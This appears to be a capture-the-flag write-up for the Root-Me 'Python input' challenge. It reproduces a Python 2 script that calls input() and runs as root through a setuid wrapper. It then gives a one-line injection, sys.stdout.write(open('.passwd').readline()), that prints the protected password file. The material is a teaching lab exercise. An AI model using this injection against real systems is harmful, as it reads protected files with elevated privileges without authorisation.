@@ -1,0 +1,40 @@
+Task on RootMe: https://www.root-me.org/en/Challenges/App-Script/Python-input
+Video Solution: https://youtu.be/ojBuu7fx5N0
+
+Source code ch6.py:
+
+----------------------------------------------------------------------
+#!/usr/bin/python2
+ 
+import sys
+ 
+def youLose():
+    print "Try again ;-)"
+    sys.exit(1)
+ 
+ 
+try:
+    p = input("Please enter password : ")
+except:
+    youLose()
+ 
+ 
+with open(".passwd") as f:
+    passwd = f.readline().strip()
+    try:
+        if (p == int(passwd)):
+            print "Well done ! You can validate with this password !"
+    except:
+        youLose()
+
+----------------------------------------------------------------------
+
+In this task we have 3 files: ch6.py, setuid-wrapper and setuid-wrapper.c
+setuid-wrapper just run ch6.py as root. We need to exploit python input vulnerability.
+If we write this 
+   sys.stdout.write(open(".passwd").readline())
+in input, our code execute with root permission. It's work because we have imported sys and this line of code
+   if (p == int(passwd)):
+will look like this
+   if (sys.stdout.write(open(".passwd").readline()) == int(passwd)):,
+ and then sys.stdout.write execute and print .passwd file to console.
